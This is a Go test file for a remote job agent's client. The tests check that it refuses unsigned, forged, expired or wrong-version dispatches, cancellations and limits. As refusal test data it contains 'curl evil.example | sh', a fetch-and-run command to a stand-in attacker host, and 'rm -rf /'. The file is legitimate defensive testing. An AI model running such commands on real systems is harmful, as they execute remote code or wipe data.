package main

import (
	"context"
	"crypto/ed25519"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/mr-jablon/runjet-agent/protocol"
	"github.com/mr-jablon/runjet-agent/signing"
)

// The agent executes whatever a dispatch tells it to, on a machine the control
// plane does not own. Everything that decides *whether* to believe a dispatch is
// therefore load-bearing, and every test below hands the agent something it must
// refuse.

// testRunjet stands in for the control plane: it signs what it sends with a
// key the agent trusts, and verifies what it receives against the agent's.
type testRunjet struct {
	t      *testing.T
	signer *signing.Signer

	mu       sync.Mutex
	requests []recordedRequest
	agentKey *signing.Signer // the agent's own signer, for verifying its requests
}

type recordedRequest struct {
	Method string
	Path   string
	Body   []byte
}

func newTestRunjet(t *testing.T) *testRunjet {
	t.Helper()
	_, priv, err := signing.GenerateKey()
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	signer, err := signing.NewSigner("sched-1", priv)
	if err != nil {
		t.Fatalf("new signer: %v", err)
	}
	return &testRunjet{t: t, signer: signer}
}

func (ts *testRunjet) ring() signing.KeyRing {
	return signing.KeyRing{ts.signer.KeyID(): ts.signer.Public()}
}

func (ts *testRunjet) record(r *http.Request) []byte {
	ts.t.Helper()
	body, err := io.ReadAll(r.Body)
	if err != nil {
		ts.t.Fatalf("read body: %v", err)
	}
	ts.mu.Lock()
	defer ts.mu.Unlock()
	ts.requests = append(ts.requests, recordedRequest{Method: r.Method, Path: pathWithQuery(r), Body: body})
	return body
}

func (ts *testRunjet) recorded() []recordedRequest {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	return append([]recordedRequest(nil), ts.requests...)
}

func pathWithQuery(r *http.Request) string {
	if r.URL.RawQuery == "" {
		return r.URL.Path
	}
	return r.URL.Path + "?" + r.URL.RawQuery
}

func writeSealed(t *testing.T, w http.ResponseWriter, signer *signing.Signer, payload any) {
	t.Helper()
	env, err := signer.Seal(payload)
	if err != nil {
		t.Fatalf("seal: %v", err)
	}
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(env); err != nil {
		t.Fatalf("encode envelope: %v", err)
	}
}

// enrolledClient wires an agent to a scheduler with an identity already in
// place, which is the state every request except enrollment is made in.
func enrolledClient(t *testing.T, ts *testRunjet, handler http.Handler) *client {
	t.Helper()
	srv := httptest.NewServer(handler)
	t.Cleanup(srv.Close)

	_, priv, err := signing.GenerateKey()
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	c := newClient(srv.URL, ts.ring())
	if err := c.authenticate("agent-1", priv); err != nil {
		t.Fatalf("authenticate: %v", err)
	}
	signer, err := signing.NewSigner("agent-1", priv)
	if err != nil {
		t.Fatalf("new signer: %v", err)
	}
	ts.agentKey = signer
	return c
}

// verifySignature checks a request the way the real scheduler's middleware
// would, so a change that broke the agent's signing would fail here rather than
// only in production.
func (ts *testRunjet) verifySignature(r *http.Request, body []byte) error {
	ts.t.Helper()
	ts_, err := strconv.ParseInt(r.Header.Get("X-Timestamp"), 10, 64)
	if err != nil {
		return err
	}
	return signing.VerifyRequest(ts.agentKey.Public(), r.Header.Get("X-Signature"), signing.Request{
		Method:    r.Method,
		Path:      pathWithQuery(r),
		Timestamp: ts_,
		Nonce:     r.Header.Get("X-Nonce"),
		Body:      body,
	})
}

func signedDispatch(t *testing.T, signer *signing.Signer, d protocol.Dispatch) signing.Envelope {
	t.Helper()
	env, err := signer.Seal(d)
	if err != nil {
		t.Fatalf("seal dispatch: %v", err)
	}
	return env
}

func validDispatch() protocol.Dispatch {
	return protocol.Dispatch{
		RunID:     "run-1",
		JobID:     "job-1",
		JobName:   "nightly backup",
		Command:   "echo hello",
		Timeout:   "1h",
		Protocol:  protocol.AgentProtocolVersion,
		IssuedAt:  time.Now(),
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}
}

func TestPollAcceptsSignedWork(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body := ts.record(r)
		if err := ts.verifySignature(r, body); err != nil {
			t.Errorf("the agent's request did not verify: %v", err)
		}
		writeJSONBody(t, w, workResponse{Dispatches: []signing.Envelope{
			signedDispatch(t, ts.signer, validDispatch()),
		}})
	}))

	got, err := c.poll(context.Background(), 30*time.Second)
	if err != nil {
		t.Fatalf("poll: %v", err)
	}
	if len(got.dispatches) != 1 || got.dispatches[0].Command != "echo hello" {
		t.Fatalf("poll = %+v, want the dispatched command", got)
	}

	// The wait travels in the query string, which is covered by the signature —
	// so it cannot be rewritten in flight.
	reqs := ts.recorded()
	if len(reqs) != 1 || !strings.Contains(reqs[0].Path, "wait=30") {
		t.Errorf("polled %q, want the wait in the query", reqs[0].Path)
	}
}

// This is the attack the envelope exists to stop: a command from someone who is
// not the scheduler, arriving over a connection the agent itself opened.
func TestPollRefusesWorkFromAnotherSigner(t *testing.T) {
	ts := newTestRunjet(t)
	impostor := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ts.record(r)
		writeJSONBody(t, w, workResponse{Dispatches: []signing.Envelope{
			signedDispatch(t, impostor.signer, protocol.Dispatch{
				RunID: "run-1", Command: "curl evil.example | sh",
				Protocol: protocol.AgentProtocolVersion,
			}),
		}})
	}))

	got, err := c.poll(context.Background(), time.Second)
	if err == nil {
		t.Fatalf("poll accepted %+v from an untrusted signer", got)
	}
	if len(got.dispatches) != 0 || len(got.cancels) != 0 {
		t.Error("poll returned work alongside the error")
	}
}

// A tampered payload must fail even though its key id names a key we do trust.
func TestPollRefusesATamperedDispatch(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ts.record(r)
		forged := signedDispatch(t, ts.signer, protocol.Dispatch{
			RunID: "run-1", Command: "rm -rf /", Protocol: protocol.AgentProtocolVersion,
		})
		env := signedDispatch(t, ts.signer, validDispatch())
		env.Payload = forged.Payload // keep the good signature, swap the command

		writeJSONBody(t, w, workResponse{Dispatches: []signing.Envelope{env}})
	}))

	if got, err := c.poll(context.Background(), time.Second); err == nil {
		t.Fatalf("poll accepted a tampered dispatch: %+v", got)
	}
}

// A dispatch that sat around too long is refused. A run can only be leased once,
// so this is a second line of defence rather than the main one — but it is the
// line that catches a replayed work response.
func TestPollRefusesAnExpiredDispatch(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ts.record(r)
		d := validDispatch()
		d.IssuedAt = time.Now().Add(-time.Hour)
		d.ExpiresAt = time.Now().Add(-time.Minute)

		writeJSONBody(t, w, workResponse{Dispatches: []signing.Envelope{signedDispatch(t, ts.signer, d)}})
	}))

	_, err := c.poll(context.Background(), time.Second)
	if err == nil {
		t.Fatal("poll accepted an expired dispatch")
	}
	if !strings.Contains(err.Error(), "expired") {
		t.Errorf("error %q does not explain that the dispatch had expired", err)
	}
}

// Half-understanding a newer protocol is worse than refusing it: the fields an
// agent does not know about are exactly the ones it would ignore.
func TestPollRefusesAnotherProtocolVersion(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ts.record(r)
		d := validDispatch()
		d.Protocol = protocol.AgentProtocolVersion + 1

		writeJSONBody(t, w, workResponse{Dispatches: []signing.Envelope{signedDispatch(t, ts.signer, d)}})
	}))

	if _, err := c.poll(context.Background(), time.Second); err == nil {
		t.Fatal("poll accepted a dispatch from a newer protocol")
	}
}

// The control plane can raise the poll wait through Limits, and pollWaitFor
// honours the longer of the two — so the length of a poll is not something this
// host knows at startup. A single timeout on the http.Client cannot bound it:
// sized from this host's own setting it cuts every raised poll short, each one
// reported as a network failure, and since the raised wait is only replaced by
// a *successful* poll the agent never receives work again. Nothing recovers it
// but a restart, and the symptom is a host where nothing runs.
func TestPollsDeadlineFollowsTheWaitItWasGiven(t *testing.T) {
	restore := pollSlack
	pollSlack = 100 * time.Millisecond
	t.Cleanup(func() { pollSlack = restore })

	ts := newTestRunjet(t)
	// A long poll holds the request open. This one takes longer than a short
	// wait allows and comfortably less than a long one.
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case <-time.After(400 * time.Millisecond):
		case <-r.Context().Done():
			return
		}
		_ = json.NewEncoder(w).Encode(workResponse{})
	}))

	if _, err := c.poll(context.Background(), time.Second); err != nil {
		t.Errorf("poll with a one-second wait failed: %v\n"+
			"\tthe deadline is coming from somewhere other than the wait it was given", err)
	}
	if _, err := c.poll(context.Background(), 50*time.Millisecond); err == nil {
		t.Error("poll with a 50ms wait answered after 400ms: the deadline is not tracking the wait at all")
	}
}

// The one bound that cannot follow a moving wait is the client's own, so there
// must not be one. Every call carries its own deadline instead.
func TestTheHTTPClientHoldsNoFixedTimeout(t *testing.T) {
	ts := newTestRunjet(t)
	if got := newClient("https://runjet.dev", ts.ring()).http.Timeout; got != 0 {
		t.Errorf("http.Client.Timeout = %s, want none: one number for every request "+
			"cannot bound a poll whose length the control plane moves", got)
	}
}

func TestPollWithNoWork(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ts.record(r)
		writeJSONBody(t, w, workResponse{Dispatches: []signing.Envelope{}})
	}))

	got, err := c.poll(context.Background(), time.Second)
	if err != nil {
		t.Fatalf("poll: %v", err)
	}
	if len(got.dispatches) != 0 {
		t.Errorf("poll = %+v, want nothing", got)
	}
}

func TestPollReportsAnErrorStatus(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ts.record(r)
		http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
	}))

	if _, err := c.poll(context.Background(), time.Second); err == nil {
		t.Fatal("poll treated a 401 as success")
	}
}

// The enrollment response is verified before any of it is believed, so an
// impostor cannot enrol an agent against itself even if it can answer first.
func TestEnrollRefusesAnUntrustedRunjet(t *testing.T) {
	ts := newTestRunjet(t)
	impostor := newTestRunjet(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeSealed(t, w, impostor.signer, enrollResponse{
			AgentID: "agent-1", AgentName: "worker", KeyID: "sched-1",
			Protocol: protocol.AgentProtocolVersion,
		})
	}))
	defer srv.Close()

	c := newClient(srv.URL, ts.ring())

	_, _, err := c.enroll(context.Background(), "one-time-token", "test")
	if err == nil {
		t.Fatal("enroll completed against an untrusted scheduler")
	}
	if !strings.Contains(err.Error(), "trusted") {
		t.Errorf("error %q does not explain that the response was not from a trusted scheduler", err)
	}
}

func TestEnrollKeepsThePrivateKeyLocal(t *testing.T) {
	ts := newTestRunjet(t)
	var sent enrollRequest
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := json.NewDecoder(r.Body).Decode(&sent); err != nil {
			t.Fatalf("decode enroll request: %v", err)
		}
		writeSealed(t, w, ts.signer, enrollResponse{
			AgentID: "agent-1", AgentName: "worker", KeyID: "sched-1",
			Protocol: protocol.AgentProtocolVersion,
		})
	}))
	defer srv.Close()
	c := newClient(srv.URL, ts.ring())

	res, priv, err := c.enroll(context.Background(), "one-time-token", "v1.2.3")
	if err != nil {
		t.Fatalf("enroll: %v", err)
	}
	if res.AgentID != "agent-1" {
		t.Errorf("agentId = %q, want agent-1", res.AgentID)
	}
	if sent.Token != "one-time-token" || sent.Version != "v1.2.3" {
		t.Errorf("enroll request = %+v, want the token and version passed through", sent)
	}

	// Only the public half may travel. The scheduler learning the private key
	// would make every signature it later verifies meaningless.
	if sent.PublicKey != signing.EncodeKey(priv.Public().(ed25519.PublicKey)) {
		t.Error("the key sent to the scheduler is not the public half of the generated pair")
	}
	if sent.PublicKey == signing.EncodeKey(priv) {
		t.Fatal("the private key was sent to the scheduler")
	}
}

// A scheduler speaking a different protocol is a configuration mistake worth
// stopping on, not something to enrol into and discover one refused run later.
func TestEnrollRefusesAnotherProtocolVersion(t *testing.T) {
	ts := newTestRunjet(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeSealed(t, w, ts.signer, enrollResponse{
			AgentID: "agent-1", Protocol: protocol.AgentProtocolVersion + 1,
		})
	}))
	defer srv.Close()
	c := newClient(srv.URL, ts.ring())

	if _, _, err := c.enroll(context.Background(), "token", "test"); err == nil {
		t.Fatal("enroll accepted a scheduler speaking another protocol")
	}
}

// Signing is the agent's whole identity, so a request built before enrollment
// must not go out unsigned.
func TestSignedRequestRefusesBeforeEnrollment(t *testing.T) {
	c := newClient("http://scheduler.invalid", signing.KeyRing{})

	if _, err := c.signedRequest(context.Background(), http.MethodGet, "/agent/work", nil); err == nil {
		t.Fatal("signedRequest produced a request for an agent with no identity")
	}
}

// A fresh nonce per request is what makes a captured request useless to replay.
func TestSignedRequestUsesAFreshNonce(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))

	first, err := c.signedRequest(context.Background(), http.MethodGet, "/agent/work", nil)
	if err != nil {
		t.Fatalf("signedRequest: %v", err)
	}
	second, err := c.signedRequest(context.Background(), http.MethodGet, "/agent/work", nil)
	if err != nil {
		t.Fatalf("signedRequest: %v", err)
	}

	if a, b := first.Header.Get("X-Nonce"), second.Header.Get("X-Nonce"); a == b {
		t.Fatalf("two requests carried the same nonce %q", a)
	}
	if first.Header.Get("X-Agent-Id") != "agent-1" {
		t.Errorf("X-Agent-Id = %q, want agent-1", first.Header.Get("X-Agent-Id"))
	}
	if first.Header.Get("X-Protocol-Version") != strconv.Itoa(protocol.AgentProtocolVersion) {
		t.Errorf("X-Protocol-Version = %q, want %d",
			first.Header.Get("X-Protocol-Version"), protocol.AgentProtocolVersion)
	}
}

func writeJSONBody(t *testing.T, w http.ResponseWriter, v any) {
	t.Helper()
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(v); err != nil {
		t.Fatalf("encode response: %v", err)
	}
}

// Everything below is a way the agent can be lied to or cut off mid-sentence.
// None of it should ever be reported as work.

// A cancellation is verified exactly as strictly as a dispatch. Being asked to
// *stop* looks harmless next to being asked to start, which is why it is worth
// proving that it is not: an unverified stop is a way to silence somebody's
// scheduled work from outside.
func TestPollRefusesCancellationsItCannotBelieve(t *testing.T) {
	impostor := newTestRunjet(t)

	for _, tc := range []struct {
		name string
		seal func(t *testing.T, ts *testRunjet) signing.Envelope
		want string
	}{
		{
			name: "signed by somebody else",
			seal: func(t *testing.T, _ *testRunjet) signing.Envelope {
				env, err := impostor.signer.Seal(protocol.Cancel{
					RunID: "run-1", Reason: "stop", Protocol: protocol.AgentProtocolVersion,
				})
				if err != nil {
					t.Fatalf("seal: %v", err)
				}
				return env
			},
			want: "refusing unverifiable cancellation",
		},
		{
			name: "speaking another protocol version",
			seal: func(t *testing.T, ts *testRunjet) signing.Envelope {
				env, err := ts.signer.Seal(protocol.Cancel{
					RunID: "run-1", Reason: "stop", Protocol: protocol.AgentProtocolVersion + 1,
				})
				if err != nil {
					t.Fatalf("seal: %v", err)
				}
				return env
			},
			want: "cancellation speaks protocol",
		},
		{
			name: "already expired",
			seal: func(t *testing.T, ts *testRunjet) signing.Envelope {
				env, err := ts.signer.Seal(protocol.Cancel{
					RunID: "run-1", Reason: "stop", Protocol: protocol.AgentProtocolVersion,
					ExpiresAt: time.Now().Add(-time.Minute),
				})
				if err != nil {
					t.Fatalf("seal: %v", err)
				}
				return env
			},
			want: "refusing cancellation",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ts := newTestRunjet(t)
			c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				_ = json.NewEncoder(w).Encode(workResponse{Cancel: []signing.Envelope{tc.seal(t, ts)}})
			}))

			_, err := c.poll(context.Background(), time.Second)
			if err == nil {
				t.Fatal("the agent accepted a cancellation it could not verify")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want it to mention %q", err, tc.want)
			}
		})
	}
}

// Raising a cap is the interesting forgery rather than lowering one: an
// unverified ceiling would let whoever sits on the wire use this host's own
// agent to exhaust it.
func TestPollRefusesLimitsItCannotBelieve(t *testing.T) {
	impostor := newTestRunjet(t)

	for _, tc := range []struct {
		name string
		seal func(t *testing.T, ts *testRunjet) signing.Envelope
		want string
	}{
		{
			name: "signed by somebody else",
			seal: func(t *testing.T, _ *testRunjet) signing.Envelope {
				env, err := impostor.signer.Seal(protocol.Limits{
					MaxParallel: 500, Protocol: protocol.AgentProtocolVersion,
				})
				if err != nil {
					t.Fatalf("seal: %v", err)
				}
				return env
			},
			want: "refusing unverifiable limits",
		},
		{
			name: "speaking another protocol version",
			seal: func(t *testing.T, ts *testRunjet) signing.Envelope {
				env, err := ts.signer.Seal(protocol.Limits{
					MaxParallel: 500, Protocol: protocol.AgentProtocolVersion + 1,
				})
				if err != nil {
					t.Fatalf("seal: %v", err)
				}
				return env
			},
			want: "limits speak protocol",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ts := newTestRunjet(t)
			c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				env := tc.seal(t, ts)
				_ = json.NewEncoder(w).Encode(workResponse{Limits: &env})
			}))

			_, err := c.poll(context.Background(), time.Second)
			if err == nil {
				t.Fatal("the agent accepted a ceiling it could not verify")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want it to mention %q", err, tc.want)
			}
		})
	}
}

// A limit that has expired is not an error, it is simply not applied: the agent
// keeps whatever its own configuration says, which is what it did before limits
// existed at all.
func TestPollIgnoresAnExpiredLimitWithoutFailing(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		env, err := ts.signer.Seal(protocol.Limits{
			MaxParallel: 500, Protocol: protocol.AgentProtocolVersion,
			ExpiresAt: time.Now().Add(-time.Minute),
		})
		if err != nil {
			t.Errorf("seal: %v", err)
			return
		}
		_ = json.NewEncoder(w).Encode(workResponse{Limits: &env})
	}))

	w, err := c.poll(context.Background(), time.Second)
	if err != nil {
		t.Fatalf("poll: %v", err)
	}
	if w.limits != nil {
		t.Errorf("limits = %+v, want none applied: an expired ceiling is stale, not a reason to stop", w.limits)
	}
}

// A scheduler that answers with something other than the work document — a
// proxy's error page, a truncated body — must not be read as "no work".
func TestPollRefusesAnAnswerItCannotDecode(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("<html>gateway timeout</html>"))
	}))

	if _, err := c.poll(context.Background(), time.Second); err == nil {
		t.Fatal("an undecodable answer was taken for an empty one")
	} else if !strings.Contains(err.Error(), "decode work response") {
		t.Errorf("error = %v, want it to say the answer could not be decoded", err)
	}
}

// Nothing may be signed before there is an identity to sign with, and the
// failure has to say so rather than sending an unsigned request the scheduler
// will refuse for an unrelated-looking reason.
func TestRequestsBeforeEnrollmentAreRefusedLocally(t *testing.T) {
	c := newClient("http://runjet.invalid", signing.KeyRing{})
	ctx := context.Background()

	if _, err := c.poll(ctx, time.Second); err == nil || !strings.Contains(err.Error(), "not enrolled") {
		t.Errorf("poll before enrollment = %v, want a local refusal", err)
	}
	if err := c.reportStatus(ctx, "run-1", statusBody{State: "running"}); err == nil ||
		!strings.Contains(err.Error(), "not enrolled") {
		t.Errorf("reportStatus before enrollment = %v, want a local refusal", err)
	}
	if err := c.heartbeat(ctx, "run-1"); err == nil || !strings.Contains(err.Error(), "not enrolled") {
		t.Errorf("heartbeat before enrollment = %v, want a local refusal", err)
	}
	if _, err := c.sendChunk(ctx, "run-1", 0, "output"); err == nil ||
		!strings.Contains(err.Error(), "not enrolled") {
		t.Errorf("sendChunk before enrollment = %v, want a local refusal", err)
	}
}

// A key that cannot sign is a misconfiguration, not a request failure, and it
// has to be caught where it can still be reported.
func TestAuthenticateRejectsAnIdentityThatCannotSign(t *testing.T) {
	ts := newTestRunjet(t)
	_, priv, err := signing.GenerateKey()
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	c := newClient("http://runjet.invalid", ts.ring())

	if err := c.authenticate("", priv); err == nil {
		t.Error("authenticate accepted an empty agent id, so requests would be signed as nobody")
	}
	if err := c.authenticate("agent-1", ed25519.PrivateKey("too short")); err == nil {
		t.Error("authenticate accepted a key of the wrong size")
	}
}

// The account a host runs commands as travels on every request, so the agent
// list can show it. Reported and never obeyed — but it has to actually be sent,
// or the risky configuration is invisible.
func TestSignedRequestCarriesTheJobAccount(t *testing.T) {
	ts := newTestRunjet(t)
	var got *http.Request
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = r.Clone(context.Background())
		w.WriteHeader(http.StatusNoContent)
	}))
	c.jobUser, c.jobIsolated = "runjet-job", true

	if err := c.heartbeat(context.Background(), "run-1"); err != nil {
		t.Fatalf("heartbeat: %v", err)
	}
	if got == nil {
		t.Fatal("the scheduler saw no request")
	}
	if v := got.Header.Get("X-Agent-Job-User"); v != "runjet-job" {
		t.Errorf("X-Agent-Job-User = %q, want the job account", v)
	}
	if v := got.Header.Get("X-Agent-Job-Isolated"); v != "true" {
		t.Errorf("X-Agent-Job-Isolated = %q, want true", v)
	}
	if v := got.Header.Get("X-Agent-Version"); v != version {
		t.Errorf("X-Agent-Version = %q, want %q", v, version)
	}
}

// A scheduler that is not there, or a URL that cannot be turned into a request,
// must fail as a request failure rather than take the agent down.
func TestEnrollFailsOnAnUnreachableOrUnusableScheduler(t *testing.T) {
	ts := newTestRunjet(t)
	ctx := context.Background()

	if _, _, err := newClient("http://127.0.0.1:1", ts.ring()).enroll(ctx, "token", "v1"); err == nil {
		t.Error("enrolling against a closed port reported success")
	}
	// A control character cannot go in a URL, so the request is never built.
	if _, _, err := newClient("http://runjet.invalid/\x7f", ts.ring()).enroll(ctx, "token", "v1"); err == nil {
		t.Error("enrolling against an unusable URL reported success")
	}
}

// An answer that is not an envelope at all. The agent must not read a proxy's
// error page as an enrollment.
func TestEnrollRefusesAnAnswerThatIsNotAnEnvelope(t *testing.T) {
	ts := newTestRunjet(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("welcome to nginx"))
	}))
	t.Cleanup(srv.Close)

	_, _, err := newClient(srv.URL, ts.ring()).enroll(context.Background(), "token", "v1")
	if err == nil {
		t.Fatal("a non-envelope answer was accepted as an enrollment")
	}
	if !strings.Contains(err.Error(), "decode enrollment envelope") {
		t.Errorf("error = %v, want it to say the envelope could not be decoded", err)
	}
}

// A body that stops arriving mid-read is a failure, not an empty answer.
func TestDoFailsWhenTheBodyIsCutShort(t *testing.T) {
	ts := newTestRunjet(t)
	c := enrolledClient(t, ts, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Length", "4096")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("half a "))
		if f, ok := w.(http.Flusher); ok {
			f.Flush()
		}
		// Return without writing the rest: the client is left waiting for a body
		// that never finishes.
		if hj, ok := w.(http.Hijacker); ok {
			conn, _, err := hj.Hijack()
			if err == nil {
				_ = conn.Close()
			}
		}
	}))

	if _, err := c.poll(context.Background(), time.Second); err == nil {
		t.Error("a truncated body was read as a complete answer")
	}
}
